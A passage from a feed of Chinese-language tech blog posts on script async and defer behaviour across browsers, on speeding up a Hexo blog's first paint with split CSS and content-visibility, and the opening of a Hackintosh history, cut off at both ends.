<code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\">\n<div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-13</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\">\n<div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-03</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 